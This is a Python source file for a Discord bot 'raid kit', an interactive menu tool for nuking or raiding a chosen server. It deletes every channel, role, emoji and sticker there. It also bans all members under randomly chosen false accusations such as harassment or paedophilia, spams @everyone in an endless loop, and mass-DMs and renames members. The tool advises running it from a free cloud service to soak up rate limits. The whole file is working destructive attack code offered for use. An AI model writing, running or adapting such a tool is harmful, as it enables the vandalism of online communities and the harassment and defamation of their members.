import asyncio
import random
from logging import getLogger
from typing import Any, Optional, Sequence, Union

import discord
from discord.ext import commands
from InquirerPy.inquirer import confirm, number, select, text  # type: ignore
from InquirerPy.validator import EmptyInputValidator

log = getLogger("discord")
class Raidkit:
  def __init__(self, bot: commands.Bot) -> None:
    self.bot: commands.Bot = bot
    self.sel_guild: Optional[discord.Guild] = None
  async def _mass_role(self, guild: discord.Guild, role_name: str, /) -> None:
    try:
      rl: discord.Role = await guild.create_role(name=role_name, permissions=discord.Permissions.none(), color=0xff0000)
      re_rl: list[BaseException | None] = await asyncio.gather(*[member.add_roles(rl) for member in guild.members], return_exceptions=True)
      for r_rl, mb in zip(re_rl, guild.members):
        if isinstance(r_rl, Exception):
          log.warning(f"Failed to give role to {mb.name}: {r_rl}")
        else:
          log.info(f"Gave role to {mb.name}")
    except discord.errors.HTTPException as e:
      log.warning(f"Failed to grant admin role: HTTPException: {e}")
    except Exception as e:
      log.warning(f"Failed to grant admin role: Exception: {e}")
  async def _mass_nick(self, guild: discord.Guild, nickname: str, /) -> None:
    re_nc: list[discord.Member | BaseException | None] = await asyncio.gather(*[mb.edit(nick=nickname) for mb in guild.members], return_exceptions=True)
    for r_nc, mb in zip(re_nc, guild.members):
      if isinstance(r_nc, Exception):
        log.warning(f"Failed to change nickname for {mb.name}: {r_nc}")
      else:
        log.info(f"Changed nickname for {mb.name} to {mb.nick}")
  async def _mass_ch(self, guild: discord.Guild, ch_name: str, ch_amount: int, /) -> None:
    old_ch = guild.channels
    re_ch: list[discord.TextChannel | BaseException] = await asyncio.gather(*[guild.create_text_channel(ch_name) for _ in range(ch_amount)], return_exceptions=True)
    new = [c for c in guild.channels if c not in old_ch]
    for r_ch, c in zip(re_ch, new):
      if isinstance(r_ch, Exception):
        log.warning(f"Failed to create channel {c.name}: {r_ch}")
      else:
        log.info(f"Created channel {c.name}")
  async def _mass_dm(self, guild: discord.Guild, message: str) -> None:
    re: list[discord.Message | BaseException] = await asyncio.gather(*[m.send(message) for m in guild.members], return_exceptions=True)
    for r, m in zip(re, guild.members):
      if isinstance(r, Exception):
        log.warning(f"Failed to send message to {m.name}: {r}")
      else:
        log.info(f"Sent message to {m.name}")
  async def _spam(self, guild: discord.Guild, message: str, /) -> None:
    if guild.me is None:
      raise NotImplementedError()
    while True:
      await asyncio.gather(*[c.send(message) for c in guild.text_channels if c.permissions_for(guild.me).send_messages], return_exceptions=True)
  async def _edit_guild(self, guild: discord.Guild, guild_name: str, guild_desc: str, /) -> None:
    try:
      flags = discord.SystemChannelFlags()
      flags.guild_reminder_notifications = True
      flags.join_notification_replies = False
      flags.join_notifications = False
      flags.premium_subscriptions = False
      flags.role_subscription_purchase_notification_replies = False
      flags.role_subscription_purchase_notifications = False
      await guild.edit(
        name=guild_name,
        description=guild_desc,
        icon=None,
        banner=None,
        splash=None,
        discovery_splash=None,
        discoverable=False,
        community=False,
        default_notifications=discord.NotificationLevel.all_messages,
        verification_level=discord.VerificationLevel.highest,
        explicit_content_filter=discord.ContentFilter.disabled,
        premium_progress_bar_enabled=False,
        preferred_locale=discord.Locale.chinese,
        afk_channel=None,
        system_channel=None,
        system_channel_flags=flags,
        rules_channel=None,
        public_updates_channel=None)
    except discord.HTTPException as exc:
      log.warning(f"Failed to edit guild {guild.name}: HTTPException: {exc}")
    except Exception as exc:
      log.warning(f"Failed to edit guild {guild.name}: Exception: {exc}")
  async def _delete_emj(self, guild: discord.Guild, /) -> None:
    old_em: tuple[discord.Emoji, ...] = guild.emojis
    re: list[BaseException | None] = await asyncio.gather(*[e.delete() for e in guild.emojis], return_exceptions=True)
    for r, em in zip(re, old_em):
      if isinstance(r, Exception):
        log.warning(f"Failed to delete emoji {em.name} from guild {guild.name}: {r}")
      else:
        log.info(f"Deleted emoji {em.name} from guild {guild.name}")
  async def _delete_stkr(self, guild: discord.Guild, /) -> None:
    old_st = guild.stickers
    re = await asyncio.gather(*[s.delete() for s in guild.stickers], return_exceptions=True)
    for r, st in zip(re, old_st):
      if isinstance(r, Exception):
        log.warning(f"Failed to delete sticker {st.name} from guild {guild.name}: {r}")
      else:
        log.info(f"Deleted sticker {st.name} from guild {guild.name}")
  async def _delete_rol(self, guild: discord.Guild, /) -> None:
    old_rl = guild.roles
    re = await asyncio.gather(*[r.delete() for r in guild.roles if not r.is_default()], return_exceptions=True)
    for r, rl in zip(re, old_rl):
      if isinstance(r, Exception):
        log.warning(f"Failed to delete role {rl.name} from guild {guild.name}: {r}")
      else:
        log.info(f"Deleted role {rl.name} from guild {guild.name}")
  async def _delete_ch(self, guild: discord.Guild, /) -> None:
    old_ch = guild.channels
    re = await asyncio.gather(*[c.delete() for c in guild.channels], return_exceptions=True)
    for r, ch in zip(re, old_ch):
      if isinstance(r, Exception):
        log.warning(f"Failed to delete channel {ch.name} from guild {guild.name}: {r}")
      else:
        log.info(f"Deleted channel {ch.name} from guild {guild.name}")
  async def _ban_mb(self, guild: discord.Guild, author: Union[discord.Member, discord.User], /) -> None:
    old_mb = guild.members
    re = await asyncio.gather(*[m.ban(reason=random.choice([
      "Racism", "Homophobia", "Transphobia", "Sexism", "Ableism", "Ageism",
      "Sexual Harassment", "Sexual Assault", "Harassment", "Stalking", "Threats",
      "Trolling", "Cyberbullying", "Bullying", "Hacking", "Doxing", "Paedophillia"
      ])) for m in guild.members if m != author and m != self.bot.user], return_exceptions=True)
    for r, mb in zip(re, old_mb):
      if isinstance(r, Exception):
        log.warning(f"Failed to ban member {mb.name} from guild {guild.name}: {r}")
      else:
        log.info(f"Banned member {mb.name} from guild {guild.name}")
  async def _nuke(self,
    guild: discord.Guild,
    ban: bool,
    guild_name: str,
    guild_desc: str,
    author: Union[discord.Member, discord.User], /
  ) -> None:
    await self._edit_guild(guild, guild_name, guild_desc)
    await self._delete_emj(guild)
    await self._delete_stkr(guild)
    await self._delete_rol(guild)
    await self._delete_ch(guild)
    if ban:
      await self._ban_mb(guild, author)
  async def _raid(self,
    guild: discord.Guild,
    guild_name: str,
    guild_desc: str,
    author: Union[discord.Member, discord.User],
    message: str,
    nickname: str,
    role_name: str,
    ch_name: str,
    ch_amount: int, /
  ) -> None:
    await self._nuke(guild, False, guild_name, guild_desc, author)
    await self._mass_nick(guild, nickname)
    await self._mass_role(guild, role_name)
    await self._mass_ch(guild, ch_name, ch_amount)
    task: asyncio.Task[None] = self.bot.loop.create_task(self._spam(guild, message))
    try:
      if confirm(f"Started spamming in {guild.name} ({guild.id}), do you want to start banning members now (no = stop)?").execute():
        task.cancel()
        await self._ban_mb(guild, author)
      else:
        task.cancel()
    except KeyboardInterrupt:
      task.cancel()
  def guild_sel(self) -> None:
    cur: Sequence[discord.Guild] = self.bot.guilds
    try:
      sel: int = int(select("Select a guild", [f"{i+1}. {g.name} ({g.id})" for i, g in enumerate(cur)]).execute().split(".")[0]) - 1
    except KeyboardInterrupt:
      return
    self.sel_guild = cur[sel]
  def raidkit_menu(self) -> None:
    while True:
      sel = int(select("Raid-kit: What do you want to do?", [
          "1. Set guild selection",
          "2. Nuke selected guild",
          "3. Raid selected guild",
          "4. Mass-nickname all members in selected guild",
          "5. Mass-role all members in selected guild",
          "6. Flood channels in selected guild",
          "7. Spam in all messageable channels of current guild",
          "8. Delete all emojis in selected guild",
          "9. Delete all stickers in selected guild",
          "10. Delete all roles in selected guild",
          "11. Delete all channels in selected guild",
          "12. Ban all members in selected guild",
          "13. Replace selected guild info",
          "14. Mass DM all members in selected guild",
          "15. Exit raid-kit menu"
        ],
        raise_keyboard_interrupt=False,
        mandatory=True,
        mandatory_message="Please select exit from the menu instead of using Ctrl-C!"
      ).execute().split(".")[0])
      if sel == 1:
        self.guild_sel()
      elif sel == 2:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.bot.user is None or self.sel_guild.me is None:
          raise NotImplementedError()
        try:
          if not self.sel_guild.me.guild_permissions.administrator:
            if not confirm(f"You do not have administrator access in {self.sel_guild.name} ({self.sel_guild.id}), do you want to proceed?", raise_keyboard_interrupt=False).execute():
              return
          ban: Union[bool, Any] = confirm("Also try to ban all members?").execute()
          n_name: Union[str, Any] = text(f"New guild name after nuking (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
          n_desc: Union[str, Any] = text(f"New guild description after nuking (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
          if not confirm(f"Are you sure you want to nuke {self.sel_guild.name} ({self.sel_guild.id})?").execute():
            return
          self.bot.loop.create_task(self._nuke(self.sel_guild, ban, n_name, n_desc, self.sel_guild.me))
        except KeyboardInterrupt:
          return
      elif sel == 3:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.bot.user is None or self.sel_guild.me is None:
          raise NotImplementedError()
        try:
          if not confirm("Foreword: raiding a guild takes a LOT of requests, often over thousands even for small guilds! Which WILL cause 429s, a LOT of them. Therefore I recommend you to run this on a cloud service like CodeSanbox (free!), do you still want to proceed?").execute():
            continue
          if not self.sel_guild.me.guild_permissions.administrator:
            if not confirm(f"You do not have administrator access in {self.sel_guild.name} ({self.sel_guild.id}), do you still want to proceed?").execute():
              continue
          r_name: Union[str, Any] = text(f"New guild name after raiding (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
          r_desc: Union[str, Any] = text(f"New guild description after raiding (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
          r_message: Union[str, Any] = text(f"Message to spam (default: @everyone NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"@everyone NUKED BY {self.bot.user.name}"
          r_nickname: Union[str, Any] = text(f"Nickname for all members (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
          r_role_name: Union[str, Any] = text(f"Role name to give all members (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
          r_ch_name: Union[str, Any] = text("Channel name to mass create (default: nuked-lol):", raise_keyboard_interrupt=False).execute() or "nuked-lol"
          r_ch_amount: int = int(number("Amount of channels to mass create (min: 1, max: 200, default: 1):", min_allowed=1, max_allowed=200, validate=EmptyInputValidator()).execute())
          if not confirm(f"Are you sure you want to raid {self.sel_guild.name} ({self.sel_guild.id})?").execute():
            continue
          self.bot.loop.create_task(self._raid(self.sel_guild, r_name, r_desc, self.sel_guild.me, r_message, r_nickname, r_role_name, r_ch_name, r_ch_amount))
        except KeyboardInterrupt:
          continue
      elif sel == 4:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.bot.user is None or self.sel_guild.me is None:
          raise NotImplementedError()
        if not self.sel_guild.me.guild_permissions.manage_nicknames:
          if not confirm(f"You are missing manage nicknames permission in {self.sel_guild.name} ({self.sel_guild.id}), continue?", raise_keyboard_interrupt=False).execute():
            continue
        nick: Union[str, Any] = text(f"Nickname for all members (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
        self.bot.loop.create_task(self._mass_nick(self.sel_guild, nick))
      elif sel == 5:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.bot.user is None or self.sel_guild.me is None:
          raise NotImplementedError()
        if not self.sel_guild.me.guild_permissions.manage_roles:
          if not confirm(f"You are missing manage roles permission in {self.sel_guild.name} ({self.sel_guild.id}), continue?", raise_keyboard_interrupt=False).execute():
            continue
        role: Union[str, Any] = text(f"Role to give all members (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
        self.bot.loop.create_task(self._mass_role(self.sel_guild, role))
      elif sel == 6:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.sel_guild.me is None:
          raise NotImplementedError()
        if not self.sel_guild.me.guild_permissions.manage_channels:
          if not confirm(f"You are missing manage channels permission in {self.sel_guild.name} ({self.sel_guild.id}), continue?", raise_keyboard_interrupt=False).execute():
            continue
        ch_name: Union[str, Any] = text("Channel name to flood (default: nuked-lol, make sure to conform to Discord's channel naming rule):", raise_keyboard_interrupt=False).execute() or "nuked-lol"
        ch_amount: int = int(number("Amount of channels to flood (min: 1, max: 200, default: 1):", min_allowed=1, max_allowed=200, validate=EmptyInputValidator()).execute())
        self.bot.loop.create_task(self._mass_ch(self.sel_guild, ch_name, ch_amount))
      elif sel == 7:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.bot.user is None or self.sel_guild.me is None:
          raise NotImplementedError()
        x: int = len([c for c in self.sel_guild.text_channels if c.permissions_for(self.sel_guild.me).send_messages])
        y: int = len([c for c in self.sel_guild.text_channels if c.type != discord.ChannelType.category])
        if x != y:
          if not confirm(f"You only have access to {x}/{y} channels in {self.sel_guild.name} ({self.sel_guild.id}), continue?", raise_keyboard_interrupt=False).execute():
            continue
        message: Union[str, Any] = text(f"Message to spam (default: @everyone NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"@everyone NUKED BY {self.bot.user.name}"
        t = self.bot.loop.create_task(self._spam(self.sel_guild, message))
        confirm(f"Started spamming in {self.sel_guild.name} ({self.sel_guild.id}), do you want to stop now (no = stop)?", raise_keyboard_interrupt=False).execute()
        t.cancel()
      elif sel == 8:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.sel_guild.me is None:
          raise NotImplementedError()
        if not self.sel_guild.me.guild_permissions.manage_guild_expressions:
          if not confirm(f"You are missing manage guild expressions permission in {self.sel_guild.name} ({self.sel_guild.id}), continue?", raise_keyboard_interrupt=False).execute():
            continue
        self.bot.loop.create_task(self._delete_emj(self.sel_guild))
      elif sel == 9:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.sel_guild.me is None:
          raise NotImplementedError()
        if not self.sel_guild.me.guild_permissions.manage_guild_expressions:
          if not confirm(f"You are missing manage guild expressions permission in {self.sel_guild.name} ({self.sel_guild.id}), continue?", raise_keyboard_interrupt=False).execute():
            continue
        self.bot.loop.create_task(self._delete_stkr(self.sel_guild))
      elif sel == 10:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.sel_guild.me is None:
          raise NotImplementedError()
        if not self.sel_guild.me.guild_permissions.manage_roles:
          if not confirm(f"You are missing manage roles permission in {self.sel_guild.name} ({self.sel_guild.id}), continue?", raise_keyboard_interrupt=False).execute():
            continue
        self.bot.loop.create_task(self._delete_rol(self.sel_guild))
      elif sel == 11:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.sel_guild.me is None:
          raise NotImplementedError()
        if not self.sel_guild.me.guild_permissions.manage_channels:
          if not confirm(f"You are missing manage channels permission in {self.sel_guild.name} ({self.sel_guild.id}), continue?", raise_keyboard_interrupt=False).execute():
            continue
        self.bot.loop.create_task(self._delete_ch(self.sel_guild))
      elif sel == 12:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.bot.user is None or self.sel_guild.me is None:
          raise NotImplementedError()
        if not self.sel_guild.me.guild_permissions.ban_members:
          if not confirm(f"You are missing ban members permission in {self.sel_guild.name} ({self.sel_guild.id}), continue?", raise_keyboard_interrupt=False).execute():
            continue
        self.bot.loop.create_task(self._ban_mb(self.sel_guild, self.sel_guild.me))
      elif sel == 13:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.bot.user is None or self.sel_guild.me is None:
          raise NotImplementedError()
        if not self.sel_guild.me.guild_permissions.manage_guild:
          if not confirm(f"You are missing manage guild permission in {self.sel_guild.name} ({self.sel_guild.id}), continue?", raise_keyboard_interrupt=False).execute():
            continue
        name: Union[str, Any] = text(f"New guild name (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
        desc: Union[str, Any] = text(f"New guild description (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
        self.bot.loop.create_task(self._edit_guild(self.sel_guild, name, desc))
      elif sel == 14:
        if self.sel_guild is None:
          print("You have not selected a guild yet, select a guild from the menu now and choose this option again")
          self.guild_sel()
          continue
        if self.bot.user is None or self.sel_guild.me is None:
          raise NotImplementedError()
        if self.sel_guild.member_count is None:
          if not confirm(f"{self.sel_guild.name} ({self.sel_guild.id}) has an unknown number of members, continue?", raise_keyboard_interrupt=False).execute():
            continue
        elif self.sel_guild.member_count > 500:
          if not confirm(f"{self.sel_guild.name} ({self.sel_guild.id}) has more than 500 members, continue?", raise_keyboard_interrupt=False).execute():
            continue
        msg: Union[str, Any] = text(f"Message to mass DM (default: NUKED BY {self.bot.user.name}):", raise_keyboard_interrupt=False).execute() or f"NUKED BY {self.bot.user.name}"
        self.bot.loop.create_task(self._mass_dm(self.sel_guild, msg))
      elif sel == 15:
        return